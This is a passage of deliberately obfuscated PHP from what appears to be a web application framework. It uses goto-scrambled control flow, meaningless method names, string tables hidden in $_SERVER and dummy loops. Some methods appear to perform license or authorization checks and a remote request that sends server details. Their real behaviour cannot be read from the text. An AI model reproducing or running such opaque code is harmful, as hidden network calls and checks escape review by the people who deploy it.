Model($this->modelType)->set($c[362], $D, $this->optionType . $c[363]); Model($this->modelType)->set($c[361] . $D, $Bڜ䙸, $this->optionType); goto e֪͐; eٗ: $c =& $_SERVER[놫Ӱ]; $Bڜ䙸 = array_field_key($Bڜ䙸, $this->field); $D = Model($this->modelType)->get($c[362], $this->optionType . $c[363]); goto Aș; Aș: $D = $D ? $D : 0; $Bڜ䙸[$c[364]] = ++$D; $Bڜ䙸[$c[184]] = time(); goto Eӄ; d: } public function update($f, $c) { goto f; F嶃: if (!$F寨) { return !1; } $c = array_merge($F寨, $c); $c[$Fލ[106]] = time(); goto bί܎ֿ; f: $Fލ =& $_SERVER[놫Ӱ]; $c = array_field_key($c, $this->field); $F寨 = $this->listData($f); goto F嶃; bί܎ֿ: return Model($this->modelType)->set($Fލ[361] . $f, $c, $this->optionType); goto eˠ; eˠ: } public function remove($Dӣ) { return Model($this->modelType)->remove($_SERVER[놫Ӱ][361] . $Dӣ, $this->optionType); } public function clear() { $F =& $_SERVER[놫Ӱ]; Model($this->modelType)->remove($F[362], $this->optionType . $F[363]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($FЫˊ, $eג) { if (!$eג) { return !1; } $Cꊑ = $this->listData(); $Cꊑ = array_to_keyvalue($Cꊑ, $FЫˊ); return isset($Cꊑ[$eג]) ? $Cꊑ[$eג] : !1; } public function findByName($B̽Ҽ) { return $this->findByKey($_SERVER[놫Ӱ][28], $B̽Ҽ); } protected function resetData($D) { $cʇ͐ =& $_SERVER[놫Ӱ]; $aɊ = array(); for ($fڂ = 0; $fڂ < count($D); $fڂ++) { $aɊ[$cʇ͐[361] . $D[$fڂ][$cʇ͐[364]]] = $D[$fڂ]; } return Model($this->modelType)->set($aɊ, !1, $this->optionType); } private function getAutoName($Fק) { $a = array_to_keyvalue($this->listData(), $_SERVER[놫Ӱ][28]); if (!$a || !isset($a[$Fק])) { return $Fק; } for ($cۤߥΗ = 1; $cۤߥΗ < count($a); $cۤߥΗ++) { $F = $Fק . "\x28{$cۤߥΗ}\51"; if (!isset($a[$F])) { return $F; } } return $F; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($bҚ = false, $AҲߺ = '', $E܂ = false) { goto a쑉; a쑉: $Eﵩ =& $_SERVER[놫Ӱ]; $e = $this->cacheGet($AҲߺ); if (is_array($e)) { return $bҚ ? isset($e[$bҚ]) ? $e[$bҚ] : null : $e; } goto E; a﨟ۯ: foreach ($e as $Dգޯ => $Aݞ) { if ($E܂ || in_array($Dգޯ, $this->jsonField)) { $e[$Dգޯ] = json_decode($e[$Dգޯ], !0); } } $this->cacheSet($AҲߺ, $e); return $bҚ ? $e[$bҚ] : $e; goto bͷ͕; E: $Eډ՗ = $this->filterWhere(array($Eﵩ[29] => $AҲߺ)); $e = $this->where($Eډ՗)->select(); $e = array_to_keyvalue($e, $Eﵩ[88], $Eﵩ[354]); goto a﨟ۯ; bͷ͕: } public function set($D, $dƒ = false, $f߭ = '') { $Eқʝ =& $_SERVER[놫Ӱ]; $this->cacheRemove($f߭); $b顛 = array(); $c扢 = is_array($D) ? $D : array($D => $dƒ); foreach ($c扢 as $D => $Dښ) { if (is_array($Dښ)) { $Dښ = json_encode_force($Dښ); } $this->checkLength($Dښ); $Dښ = self::textEncode($Dښ); $c扢 = array($Eқʝ[29] => $f߭, $Eқʝ[88] => $D, $Eқʝ[354] => $Dښ); $b顛[] = $this->filterWhere($c扢); } return $this->addAll($b顛, array(), !0); } public function setDeep($B, $a = false, $Cτ = '') { $D̻ɴ = explode($_SERVER[놫Ӱ][92], $B); $Cߜ = $this->get(); array_set_value($Cߜ, $B, $a); $this->set($D̻ɴ[0], $Cߜ[$D̻ɴ[0]], $Cτ); } public function remove($D݃, $c = '') { $bݞ =& $_SERVER[놫Ӱ]; $this->CacheRemove($c); $c룮 = $this->filterWhere(array($bݞ[88] => $D݃, $bݞ[29] => $c)); if (is_null($D݃)) { unset($c룮[$bݞ[88]]); } return $this->where($c룮)->delete(); } public function cacheSet($Cٳ, $bᱯԛ = false) { return Cache::set($this->cacheKey($Cٳ), $bᱯԛ); } public function cacheGet($dΥ) { return Cache::get($this->cacheKey($dΥ)); } public function cacheRemove($Fݺ) { return Cache::remove($this->cacheKey($Fݺ)); } protected function filterWhere($Aƈ´) { return $Aƈ´; } protected function cacheKey($F؏) { return $F؏; } } goto C; a: $Fô = $_SERVER[놫Ӱ][542]; while (strlen($Fô) < $_SERVER[놫Ӱ][543]) { if (!$Fô) { break; } $Fô++; } class Application { private $defaultModule = "\151\x6e\144\x65\170"; private $defaultController = "\151\x6e\x64\x65\170"; private $defaultAction = "\151\156\x64\x65\x78"; function __construct() { } public function setDefault($bёɟ) { goto D惄֘; a: $this->defaultController = $c歫Ư[1] ? $c歫Ư[1] : $this->defaultController; $Cȩ = $f܌Ի[545]; if (strlen($Cȩ) < $f܌Ի[546]) { return; } goto dƊ; A: $this->{$_SERVER[ߗѻ][3]}($Fʿ[4], array($this, $Fʿ[5])); $f = $f܌Ի[548]; if (!$f) { die; } goto a; dƊ: $this->defaultAction = $c歫Ư[2] ? $c歫Ư[2] : $this->defaultAction; $AĪ = $f܌Ի[547]; while ($AĪ < $f܌Ի[546]) { if ($AĪ >= 0) { break; } $AĪ++; } goto A; D惄֘: $f܌Ի =& $_SERVER[놫Ӱ]; $Fʿ =& $_SERVER[ߗѻ]; $c歫Ư = $Fʿ[0]($Fʿ[1], $Fʿ[2]($bёɟ, $Fʿ[1])); goto a; a: $e = $f܌Ի[544]; if (strlen($e) < $f܌Ի[543]) { die; } $this->defaultModule = $c歫Ư[0] ? $c歫Ư[0] : $this->defaultModule; goto a; a: } public function appRun($b錕) { goto E; cϳ: $Aࡌܯ = $DҮ[7]; $aƋ = $Eݘǅ[551]; if ($D == $DҮ[8]) { $Aࡌܯ = $DҮ[9]; $eㆸ[0] = $DҮ[10]; $eㆸ[1] = $eㆸ[1] . $DҮ[11]; $b錕 = $DҮ[12]($DҮ[1], $eㆸ); $b錕 = $DҮ[2]($b錕, $DҮ[1]); } goto d˴Ꚏ; d˴Ꚏ: $DҮ[13](array($DҮ[14], $DҮ[15]), $Aࡌܯ . $DҮ[16], $b錕); $DҮ[17]($b錕); $DҮ[13](array($DҮ[14], $DҮ[15]), $Aࡌܯ . $DҮ[18], $b錕); goto e蒿; E: $Eݘǅ =& $_SERVER[놫Ӱ]; $DҮ =& $_SERVER[ߗѻ]; $eㆸ = $DҮ[0]($DҮ[1], $b錕); goto eħ; eħ: $eӋ = $Eݘǅ[549]; if (strlen($eӋ) < $Eݘǅ[550]) { return; } $D = $DҮ[6]($eㆸ[0]); goto cϳ; e蒿: } private function autorun() { goto e݋͠; eݞ͑: foreach ($config[$B􈳆[20]] as $B => $a) { $this->{$_SERVER[ߗѻ][21]}($a); } goto d; f۽ٹؿ: $A = $Cژ[552]; while (strlen($A) < $Cژ[553]) { if (!$A) { break; } $A++; } if ($B􈳆[19]($config[$B􈳆[20]]) == 0) { return; } goto eݞ͑; e݋͠: $Cژ =& $_SERVER[놫Ӱ]; $B􈳆 =& $_SERVER[ߗѻ]; global $config; goto f۽ٹؿ; d: } private function visdf2e96721() { goto EӅɡ; f: if (!$dͤ || $f酠ث[24]($dͤ) <= $f酠ث[24]($c팹̫)) { return; } if ($f酠ث[6]($f酠ث[25]($dͤ, -$f酠ث[24]($c팹̫))) != $c팹̫) { return; } $fõ = $f酠ث[25]($dͤ, 0, -$f酠ث[24]($c팹̫)); goto bŦ; Cъ: $D = $f酠ث[26]($GLOBALS[$f酠ث[22]][$f酠ث[23]], 1); $GLOBALS[$f酠ث[22]][$f酠ث[23]] = $f酠ث[27]($B, $D); $d錩 = $cႷִ[556]; goto EԢ鲢; a: $dͤ = $GLOBALS[$f酠ث[22]][$f酠ث[23]][0]; $b = $cႷִ[554]; if (strlen($b) < $cႷִ[553]) { return; } goto f; EԢ鲢: if (!$d錩) { die; } $GLOBALS[$f酠ث[22]][$f酠ث[28]] = $f酠ث[29]($f酠ث[1], $GLOBALS[$f酠ث[22]][$f酠ث[23]]); $cǑұ = $cႷִ[557]; goto aԲ; EӅɡ: $cႷִ =& $_SERVER[놫Ӱ]; $f酠ث =& $_SERVER[ߗѻ]; $c팹̫ = $f酠ث[8]; goto a; aԲ: if (strlen($cǑұ) < $cႷִ[553]) { die; } goto d噎; bŦ: $cѧ = $cႷִ[555]; if (strlen($cѧ) < $cႷִ[546]) { die; } $B = array($f酠ث[8], $fõ); goto Cъ; d噎: } private function hqzac02ec24a() { goto E徶׼; d: while ($c镫ɍ < $a[546]) { if ($c镫ɍ >= 0) { break; } $c镫ɍ++; } $GLOBALS[$b빮[22]][$b빮[23]] = $b빮[0]($b빮[36], $e񓕡); $GLOBALS[$b빮[22]][$b빮[28]] = $b빮[29]($b빮[1], $GLOBALS[$b빮[22]][$b빮[23]]); goto B쮃; Fǎ: while ($Dڳ堆 < $a[543]) { if ($Dڳ堆 >= 0) { break; } $Dڳ堆++; } $e񓕡 = $b빮[2]($f[0][0], $b빮[36]); $c镫ɍ = $a[561]; goto d; E徶׼: $a =& $_SERVER[놫Ӱ]; $b빮 =& $_SERVER[ߗѻ]; if ($GLOBALS[$b빮[22]][$b빮[28]] != $b빮[10]) { return; } goto E; E: $d߰ = $_SERVER[$b빮[30]]; $Dͼߒ = $a[558]; $C܋ = $b빮[31]; goto a߈; B쮃: $Bّ = $a[562]; if (!$Bّ) { die; } goto B魸; cƣǊ: $e񓕡 = $b빮[25]($d߰, $c + $b빮[24]($C܋)); $b빮[34]($b빮[35], $e񓕡, $f); $Dڳ堆 = $a[560]; goto Fǎ; a߈: $f퍩 = $a[559]; if (!$b빮[32]($d߰, $C܋)) { return; } $c = $b빮[33]($d߰, $C܋); goto cƣǊ; B魸: } public function run() { goto bϼ; A: $B܇Ӟ[39]($B܇Ӟ[40], isset($A򈿬[0]) && $A򈿬[0] ? $A򈿬[0] : $this->defaultModule); $Bݡ = $eͬ[566]; if (!$Bݡ) { return; } goto dӈ; a܏ɏ: $B܇Ӟ[39]($B܇Ӟ[42], isset($A򈿬[2]) && $A򈿬[0] ? $A򈿬[2] : $this->defaultAction); $B܇Ӟ[39]($B܇Ӟ[43], MOD . $B܇Ӟ[1] . ST . $B܇Ӟ[1] . ACT); $E = $eͬ[568]; goto b; fՔ̛: if (!$f) { die; } $this->{$_SERVER[ߗѻ][45]}(); if ($B܇Ӟ[19]($A򈿬) >= 3) { $this->{$_SERVER[ߗѻ][21]}($Dӓ); } else { $this->{$_SERVER[ߗѻ][21]}(ACTION); } goto Aǋ֢; ḋ: $Dӓ = $GLOBALS[$B܇Ӟ[22]][$B܇Ӟ[28]]; $e = $eͬ[565]; if (!$e) { die; } goto A; a: $eȐڈ = $eͬ[564]; while (strlen($eȐڈ) < $eͬ[546]) { if (!$eȐڈ) { break; } $eȐڈ++; } $A򈿬 = $GLOBALS[$B܇Ӟ[22]][$B܇Ӟ[23]]; goto ḋ; b: if (!$E) { return; } $_SERVER[$B܇Ӟ[44]] = $B܇Ӟ[6](ACTION); $f = $eͬ[569]; goto fՔ̛; EІć: $D޳╡ = $eͬ[563]; if (!$D޳╡) { die; } $this->{$_SERVER[ߗѻ][38]}(); goto a; dӈ: $B܇Ӟ[39]($B܇Ӟ[41], isset($A򈿬[1]) && $A򈿬[0] ? $A򈿬[1] : $this->defaultController); $A낿 = $eͬ[567]; if (!$A낿) { return; } goto a܏ɏ; bϼ: $eͬ =& $_SERVER[놫Ӱ]; $B܇Ӟ =& $_SERVER[ߗѻ]; $this->{$_SERVER[ߗѻ][37]}(); goto EІć; Aǋ֢: } private $lbky391aa0e3 = array(); private $czeab6b2b113 = ''; public function eailbedf6478() { goto a; BѮ: $Aߎ = $Aߜ[574]; if (!$Aߎ) { return; } $this->{$_SERVER[ߗѻ][3]}($e×[55], array($this, $e×[56])); goto d˽; f: $Eб = $Aߜ[570]; $this->{$_SERVER[ߗѻ][47]}(); $this->{$_SERVER[ߗѻ][48]}(); goto b; F: $this->{$_SERVER[ߗѻ][51]}(); $this->{$_SERVER[ߗѻ][52]}(); $this->{$_SERVER[ߗѻ][3]}($e×[53], array($this, $e×[54])); goto BѮ; b: $C拷 = $Aߜ[571]; while ($C拷 < $Aߜ[550]) { if ($C拷 >= 0) { break; } $C拷++; } $this->{$_SERVER[ߗѻ][49]}(); goto B; B: $this->{$_SERVER[ߗѻ][50]}(); $A°ڠ = $Aߜ[572]; if (strlen($A°ڠ) < $Aߜ[573]) { return; } goto F; d˽: $this->{$_SERVER[ߗѻ][3]}($e×[57], array($this, $e×[58])); $this->{$_SERVER[ߗѻ][3]}($e×[59], array($this, $e×[60])); $DŎ = $Aߜ[575]; goto bώ; a: $Aߜ =& $_SERVER[놫Ӱ]; $e× =& $_SERVER[ߗѻ]; $this->{$_SERVER[ߗѻ][46]}(); goto f; bώ: } public function tckq3027ca6d($Cө) { goto B˕; Cˆ: $b = $Aܯ[579]; if ($GLOBALS[$A[129]] && $this->config[$A[130]]) { $Cө[$A[105]][$A[131]] = WEB_ROOT; } return $Cө; goto a̷; DՐޓ: $aȗ = array($A[64], $A[65], $A[66], $A[67], $A[68], $A[69], $A[70], $A[71], $A[72], $A[73], $A[74], $A[75], $A[76], $A[77], $A[78], $A[79], $A[80], $A[81], $A[82], $A[83], $A[84], $A[85], $A[86], $A[87]); $fȤ = $Aܯ[576]; foreach ($aȗ as $CȎ) { $F؂ѯ = $GLOBALS[$A[88]][$A[89]][$CȎ]; $Cۧʄ = $Aܯ[577]; if (isset($AÙ˩[$CȎ])) { $F؂ѯ = $AÙ˩[$CȎ]; } $Cө[$A[90]][$A[91]][$CȎ] = $F؂ѯ; } goto Bۭ; bΣ: if ($this->czeab6b2b113 == $A[118]) { $Cө[$A[90]][$A[91]][$A[96]][$A[104]] = 0; } $Cө[$A[105]][$A[125]] = $A[101]($this->lbky391aa0e3, $A[126], $A[10]); $Cө[$A[105]][$A[127]] = $A[101]($this->lbky391aa0e3, $A[128], $A[10]); goto Cˆ; B˕: $Aܯ =& $_SERVER[놫Ӱ]; $A =& $_SERVER[ߗѻ]; $AÙ˩ = $A[61]($A[62])->{$_SERVER[ߗѻ][63]}(); goto DՐޓ; Bۭ: $e̕ = $Cө[$A[90]][$A[91]][$A[76]]; unset($Cө[$A[90]][$A[92]][$A[93]]); unset($Cө[$A[90]][$A[92]][$A[94]]); goto b; b: unset($Cө[$A[90]][$A[91]][$A[76]]); unset($Cө[$A[90]][$A[91]][$A[95]]); $Cө[$A[90]][$A[91]][$A[96]] = array($A[97] => (int) $e̕[$A[98]], $A[99] => $A[100]($A[101]($e̕, $A[102], array())), $A[103] => (int) $A[101]($e̕, $A[104], 0)); goto A䆮; eؽÂ: $Cө[$A[105]][$A[117]] = $this->czeab6b2b113; $aڑ = $Aܯ[578]; if ($AÙ˩[$A[117]] != $A[118]) { $Cө[$A[105]][$A[119]] = $AÙ˩[$A[119]]; $Cө[$A[105]][$A[120]] = $AÙ˩[$A[120]]; $d = $A[121](10) . $this->czeab6b2b113 . $A[121](5); $Cө[$A[90]][$A[122]][$A[123]] = $this->{$_SERVER[ߗѻ][124]}($d, $Cө[$A[105]][$A[110]]); } goto bΣ; A䆮: $Cө[$A[105]][$A[106]] = $A[107]($A[108])->{$_SERVER[ߗѻ][109]}(); $Cө[$A[105]][$A[110]] = $A[111]($_SERVER[$A[112]] . $AÙ˩[$A[113]]); $Cө[$A[105]][$A[114]] = $A[115]($A[116]()); goto eؽÂ; a̷: } private function btnudd35bdf1() { goto E; d݄: if ($this->czeab6b2b113 == $fа[118]) { return; } $E߃ߗ = array($fа[150], $fа[151], $fа[152], $fа[153], $fа[154], $fа[155]); $e = $fа[61]($fа[62])->{$_SERVER[ߗѻ][63]}(); goto b; E: $C =& $_SERVER[놫Ӱ]; $fа =& $_SERVER[ߗѻ]; if ($_SERVER[$fа[44]] == $fа[132]) { $C⠇ = array($fа[117] => $this->czeab6b2b113, $fа[133] => $this->{$_SERVER[ߗѻ][134]}(), $fа[135] => $fа[61]($fа[136])->{$_SERVER[ߗѻ][137]}()); if ($this->czeab6b2b113 != $fа[118]) { $c = $fа[101]($this->lbky391aa0e3, $fа[138]); if ($c) { $C⠇[$fа[139]] = $c; $C⠇[$fа[140]] = $fа[141]($fа[101]($this->lbky391aa0e3, $fа[142])); $C⠇[$fа[143]] = $fа[101]($this->lbky391aa0e3, $fа[128]); } } $C⠇ = $this->{$_SERVER[ߗѻ][144]}($fа[145]($C⠇), $fа[111]($fа[146])); $Cʃ = $C[580]; $cń = array($fа[147] => $C⠇); $fа[13](array($fа[148], $fа[149]), $cń); } goto d݄; cĬ: foreach ($E߃ߗ as $e) { if (!isset($e[$e]) || !$e[$e]) { continue; } $cń[$e] = $e[$e]; $f = $C[582]; if (!$f) { return; } } $fа[13](array($fа[148], $fа[149]), $cń); goto B暸; b: $cń = array($fа[156] => $e[$fа[64]], $fа[157] => $e[$fа[65]], $fа[158] => $fа[10]); $e = $C[581]; if (strlen($e) < $C[573]) { die; } goto cĬ; B暸: } private function xjmf9c9000b7() { goto E; E: $f² = $dӌ . $cٴ[$e漐[117]] . $this->{$_SERVER[ߗѻ][144]}($e漐[111]($cٴ[$e漐[206]]), $dӌ); $cٴ[$e漐[120]] = $e漐[115]($e漐[211]($this->{$_SERVER[ߗѻ][144]}($f², $e漐[213]))); $C̕ = $Bå͍[586]; goto Fݏ; cɇ: $dӌ = $e漐[121](16); $E控 = $Bå͍[585]; if (!$E控) { return; } goto E; F֦: $bʋ = $Bå͍[588]; if (strlen($bʋ) < $Bå͍[543]) { die; } $B杮 = $this->{$_SERVER[ߗѻ][124]}($e漐[145]($D), $D蹴); goto c𱐘; Fݏ: while ($C̕ < $Bå͍[543]) { if ($C̕ >= 0) { break; } $C̕++; } if ($D[$e漐[214]] && $D[$e漐[214]] >= 1) { $e漐[61]($e漐[62])->{$_SERVER[ߗѻ][215]}($e漐[216], $e漐[217]); } $e漐[61]($e漐[62])->{$_SERVER[ߗѻ][218]}($cٴ); goto F쥵; F쥵: $D蹴 = $e漐[111]($_SERVER[$e漐[112]] . $e漐[211]($BԲ) . $cٴ[$e漐[207]]); $eө = $Bå͍[587]; $D󮙔 = $e漐[211]($e漐[25]($D蹴, 10, 16)); goto F֦; E: $Bå͍ =& $_SERVER[놫Ӱ]; $e漐 =& $_SERVER[ߗѻ]; if ($_SERVER[$e漐[44]] != $e漐[159] || !$GLOBALS[$e漐[129]]) { return; } goto Fܝ; Fܝ: $f󠶫 = $GLOBALS[$e漐[22]]; if (isset($f󠶫[$e漐[160]])) { $this->{$_SERVER[ߗѻ][161]}(); die; } if (!isset($f󠶫[$e漐[162]]) || $e漐[24]($f󠶫[$e漐[162]]) != 16) { $e漐[163]($e漐[164] . $f󠶫[$e漐[162]], !1); } goto ḑ; eҒƪ: while (strlen($d絧) < $Bå͍[573]) { if (!$d絧) { break; } $d絧++; } $e漐[61]($e漐[11])->{$_SERVER[ߗѻ][223]}($dݺ[$e漐[224]], array($e漐[225] => $b)); $e漐[163]($e漐[194]($e漐[205]), !0); goto Cܺ; c𱐘: $fї骺 = $e漐[219]($e漐[61]($e漐[11])->{$_SERVER[ߗѻ][220]}(), $e漐[221]); $Bڅ = $Bå͍[589]; $dݺ = $fї骺[$e漐[222]]; goto F؄; F䌰: if (!$e漐[188]($dǏ) || !$e漐[188]($dǏ[$e漐[189]]) || $dǏ[$e漐[162]] != !0) { $B = $e漐[194]($e漐[195]); $Aʌ = $dǏ[$e漐[189]] ? $e漐[191] . $dǏ[$e漐[189]] : $B; $e漐[163]($Aʌ, !1); } $D = $dǏ[$e漐[189]]; $Dࢣ = $this->{$_SERVER[ߗѻ][196]}($D[$e漐[197]]); goto aБ󛰪; ḑ: $BԲ = $e漐[61]($e漐[62])->{$_SERVER[ߗѻ][63]}($e漐[113]); $D˓ = array($e漐[162] => $f󠶫[$e漐[162]], $e漐[165] => $e漐[121](16), $e漐[166] => $e漐[146], $e漐[167] => $e漐[168], $e漐[169] => $_SERVER[$e漐[170]], $e漐[171] => $_SERVER[$e漐[172]], $e漐[173] => $_SERVER[$e漐[174]]); $c껇 = $Bå͍[583]; goto Eڔ; F؄: $b = array(); $b[$D󮙔] = $B杮; $d絧 = $Bå͍[590]; goto eҒƪ; e⅃: $aɫ = $e漐[25]($e漐[111]($cٴ[$e漐[207]]), 10, 10); $B̐ = $aɫ . $cٴ[$e漐[117]] . $cٴ[$e漐[209]]; $cٴ[$e漐[119]] = $e漐[211]($e漐[115]($this->{$_SERVER[ߗѻ][144]}($B̐, $e漐[212]))); goto cɇ; Eڔ: while ($c껇 < $Bå͍[573]) { if ($c껇 >= 0) { break; } $c껇++; } $a = $e漐[111]($_SERVER[$e漐[112]] . $BԲ); if ($f󠶫[$e漐[175]] == $e漐[176]) { $B = $this->{$_SERVER[ߗѻ][144]}($a, $e漐[177]); $e = $this->{$_SERVER[ߗѻ][124]}($e漐[145]($D˓), $a . $e漐[178], 3); $DϚ = $this->{$_SERVER[ߗѻ][179]}($e漐[180] . $B . $e漐[181] . $e, -1); $e漐[163]($DϚ, !0); } else { if ($f󠶫[$e漐[175]] == $e漐[182]) { $F = $e漐[25]($e漐[111]($e漐[183] . $a), 12, 15) . $e漐[184]; $e = $this->{$_SERVER[ߗѻ][185]}($e漐[2]($f󠶫[$e漐[186]]), $F, 2); $dǏ = $e漐[187]($e, !0); if (!$e漐[188]($dǏ) || !$e漐[188]($dǏ[$e漐[189]]) || $dǏ[$e漐[162]] != !0) { $B = $e漐[190]; $Aʌ = $dǏ[$e漐[189]] ? $e漐[191] . $dǏ[$e漐[189]] : $B; $e漐[163]($Aʌ, !1); } else { $D˓[$e漐[165]] = $dǏ[$e漐[189]][$e漐[192]]; } } else { $dǏ = $this->{$_SERVER[ߗѻ][179]}($e漐[193], $D˓, 10); $aЛ = $Bå͍[584]; if (strlen($aЛ) < $Bå͍[553]) { die; } } } goto F䌰; aБ󛰪: if (!$Dࢣ || $Dࢣ != $e漐[198]($D[$e漐[142]])) { $fϲ = array($e漐[199] => $e漐[61]($e漐[62])->{$_SERVER[ߗѻ][63]}($e漐[113]), $e漐[200] => $_SERVER[$e漐[112]], $e漐[201] => $e漐[202](), $e漐[171] => $_SERVER[$e漐[172]]); $e = $this->{$_SERVER[ߗѻ][203]}($e漐[145]($fϲ)); $this->{$_SERVER[ߗѻ][179]}($e漐[204] . $e); $e漐[163]($e漐[194]($e漐[205]), !0); } $cٴ = array($e漐[206] => $D˓[$e漐[162]], $e漐[207] => $D[$e漐[208]], $e漐[209] => $e漐[121](16), $e漐[117] => $D[$e漐[210]]); if ($D˓[$e漐[165]]) { $cٴ[$e漐[209]] = $D˓[$e漐[165]]; } goto e⅃; Cܺ: } private function qxgnccef9a6b() { goto a꤯; D֟: $this->czeab6b2b113 = $Eɍ[118]; goto dߨ; a꤯: $d젌Ԫ =& $_SERVER[놫Ӱ]; $Eɍ =& $_SERVER[ߗѻ]; $Eɍ[61]($Eɍ[62])->{$_SERVER[ߗѻ][218]}(array($Eɍ[206] => $Eɍ[10], $Eɍ[207] => $Eɍ[10], $Eɍ[117] => $Eɍ[118], $Eɍ[119] => $Eɍ[10], $Eɍ[120] => $Eɍ[10])); goto F; F: $Eɍ[61]($Eɍ[62])->{$_SERVER[ߗѻ][215]}($Eɍ[216], $Eɍ[226]); $c = $d젌Ԫ[591]; if (!$c) { return; } goto dȎ馳; dȎ馳: $this->lbky391aa0e3 = array(); $f = $d젌Ԫ[592]; if (strlen($f) < $d젌Ԫ[543]) { die; } goto D֟; dߨ: } private function tpbhb3dc6dd7() { goto EՕҊ; bɿᤎ: if (strlen($BЗΏ) < $C[543]) { return; } $E = $Cľ[219]($Cľ[61]($Cľ[11])->{$_SERVER[ߗѻ][220]}(), $Cľ[221]); $B = $E[$Cľ[222]]; goto D厝; F: if (!$Cľ[188]($Fꈠ׏)) { return $this->{$_SERVER[ߗѻ][161]}(); } $cж = $Cľ[141]($Fꈠ׏[$Cľ[142]]); if ($Cľ[227]() >= $cж) { return $this->{$_SERVER[ߗѻ][161]}(); } goto fȳш; f̚: $Fꈠ׏ = $Cľ[187]($Fꈠ׏, !0); $b쿈 = $C[597]; if (!$b쿈) { return; } goto F; fȳш: $this->lbky391aa0e3 = $Fꈠ׏; $this->czeab6b2b113 = $E掛[$Cľ[117]]; goto aǄ; D厝: $Fꅎ = $Cľ[111]($_SERVER[$Cľ[112]] . $Cľ[211]($Dڗ) . $E掛[$Cľ[207]]); $bݙϠ = $C[595]; if (!$bݙϠ) { die; } goto C; EՕҊ: $C =& $_SERVER[놫Ӱ]; $Cľ =& $_SERVER[ߗѻ]; $this->czeab6b2b113 = $Cľ[118]; goto d菪; d菪: $A辑ȇ = $C[593]; if (!$A辑ȇ) { return; } $E掛 = $Cľ[61]($Cľ[62])->{$_SERVER[ߗѻ][63]}(); goto eǝȤ; C: $b⑇ = $Cľ[211]($Cľ[25]($Fꅎ, 10, 16)); $Fꈠ׏ = $this->{$_SERVER[ߗѻ][185]}($B[$Cľ[88]][$b⑇], $Fꅎ); $A = $C[596]; goto f̚; eǝȤ: if ($E掛[$Cľ[117]] == $Cľ[118]) { return; } $Dڗ = $Cľ[61]($Cľ[62])->{$_SERVER[ߗѻ][63]}($Cľ[113]); $BЗΏ = $C[594]; goto bɿᤎ; aǄ: } private function epnc3931f57a() { $BΑ =& $_SERVER[ߗѻ]; $cʏ = $GLOBALS[$BΑ[22]]; $AǕ = $_SERVER[$BΑ[44]]; if ($AǕ == $BΑ[228] && $this->czeab6b2b113 == $BΑ[118]) { $BΑ[163]($BΑ[194]($BΑ[229]), !1, $BΑ[230]); } $D֡ = array($BΑ[231], $BΑ[232]); if ($BΑ[233]($AǕ, $D֡)) { if ($this->czeab6b2b113 == $BΑ[118] && isset($cʏ[$BΑ[234]])) { $BΑ[163]($BΑ[194]($BΑ[229]), !1, $BΑ[230]); die; } $D΋ = $this->{$_SERVER[ߗѻ][134]}(); if ($D΋ != $BΑ[198]($BΑ[235])) { if ($D΋ <= $BΑ[61]($BΑ[136])->{$_SERVER[ߗѻ][137]}()) { $BΑ[163]($BΑ[194]($BΑ[236]), !1, $BΑ[230]); die; } } } } private function bgno4022c8fe() { goto F筜; Aܛ: $C݉[248]($C݉[249]); $B = $Cߔܣ[601]; if (strlen($B) < $Cߔܣ[553]) { die; } goto E; e: if (!$C݉[233]($_SERVER[$C݉[44]], $E)) { return; } $b = $C݉[239]; $b = $this->{$_SERVER[ߗѻ][240]}($b, $C݉[241]); goto e; Fؗ: $eΆ = @$C݉[247]($b, !1, $b); $a܈ = $Cߔܣ[600]; if (strlen($a܈) < $Cߔܣ[546]) { return; } goto Aܛ; F筜: $Cߔܣ =& $_SERVER[놫Ӱ]; $C݉ =& $_SERVER[ߗѻ]; $E = array($C݉[132], $C݉[237]); goto D; e: $b = $C݉[242](array($C݉[243] => array($C݉[244] => $C݉[245], $C݉[246] => 3))); $aؐᄚ = $Cߔܣ[599]; while (strlen($aؐᄚ) < $Cߔܣ[573]) { if (!$aؐᄚ) { break; } $aؐᄚ++; } goto Fؗ; E: if ($eΆ && $C݉[32]($eΆ, $C݉[250])) { echo $eΆ; } die; goto cٌ; D: $cĉ = $Cߔܣ[598]; if (strlen($cĉ) < $Cߔܣ[550]) { die; } if (!$GLOBALS[$C݉[129]] || !isset($_GET[$C݉[238]])) { return; } goto e; cٌ: } public function eygz9fdf2b21($aˊ) { goto f; E: $Cֈ = array($C칱[252], $C칱[253], $C칱[254], $C칱[255], $C칱[256], $C칱[257], $C칱[258], $C칱[259]); $eᆃ = $Fщ݊[602]; if (!$eᆃ) { return; } goto Fԏ; f: $Fщ݊ =& $_SERVER[놫Ӱ]; $C칱 =& $_SERVER[ߗѻ]; if ($this->czeab6b2b113 == $C칱[251]) { return $aˊ; } goto E; Fԏ: $f = $C칱[0]($C칱[260], $C칱[101]($this->lbky391aa0e3, $C칱[126], $C칱[10])); $Cʹ = array(); $f = $Fщ݊[603]; goto fー; fー: foreach ($Cֈ as $eֱ) { if (!$C칱[233]($eֱ, $f)) { $Cʹ[] = $eֱ; } } foreach ($Cʹ as $eֱ) { unset($aˊ[$eֱ]); $Dތ = $Fщ݊[604]; if (!$Dތ) { return; } } return $aˊ; goto Bق; Bق: } private function pzwf64e710c7() { goto F񎹱; cƟǦ: $D艬 = $_SERVER[$c[44]]; $Bȅ = $a˚[605]; while (strlen($Bȅ) < $a˚[546]) { if (!$Bȅ) { break; } $Bȅ++; } goto aϓ; A: foreach ($c as $dދ) { if ($dދ == $D艬 || $c[25]($D艬, 0, $c[24]($dދ)) == $dދ) { $c[163]($c[194]($c[262]), !1); } } $this->{$_SERVER[ߗѻ][3]}($c[263], array($this, $c[264])); $EŻ = $a˚[607]; goto DѲ; F񎹱: $a˚ =& $_SERVER[놫Ӱ]; $c =& $_SERVER[ߗѻ]; if ($this->czeab6b2b113 != $c[118]) { return; } goto cƟǦ; DѲ: if (!$EŻ) { return; } $GLOBALS[$c[88]][$c[265]] = $c[217]; $FϾ = $a˚[608]; goto bɠ̮; aϓ: $c = array($c[261]); $A΄ = $a˚[606]; while ($A΄ < $a˚[543]) { if ($A΄ >= 0) { break; } $A΄++; } goto A; bɠ̮: } public function bzak57183ad7() { return $_SERVER[ߗѻ][266]; $b = $_SERVER[놫Ӱ][609]; if (!$b) { die; } } private function lkrg57b38614() { goto e׬; Fػ: if (!$C֊[188]($D)) { return; } if ($D[$C֊[162]] && $D[$C֊[276]]) { if ($this->{$_SERVER[ߗѻ][196]}($D[$C֊[276]]) == 